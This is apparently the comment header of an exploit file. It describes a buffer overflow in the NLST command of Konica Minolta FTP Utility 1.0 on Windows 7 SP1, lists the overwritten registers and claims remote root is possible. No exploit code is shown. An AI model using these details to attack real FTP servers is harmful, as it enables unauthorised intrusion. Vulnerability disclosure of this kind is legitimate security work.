# Vulnerable Application: Konica Minolta FTP Utility
# Version: 1.0
# Server: FTP Server
# Vulnerable Command: NLST
# Tested on: Windows 7 SP1

# Impact: There is a buffer overflow vulnerability in the NLST command of the FTP server
# "Konica Minolta FTP Utility" that will allow an attacker to overwrite some registers, 
# such as EAX, ESI, EDI... Even though the next codes will crash the FTP server and overwrite 
# some registers, an individual can use the vulnerable command to build a remote buffer 
# overflow exploit that will root a system without any user interaction.
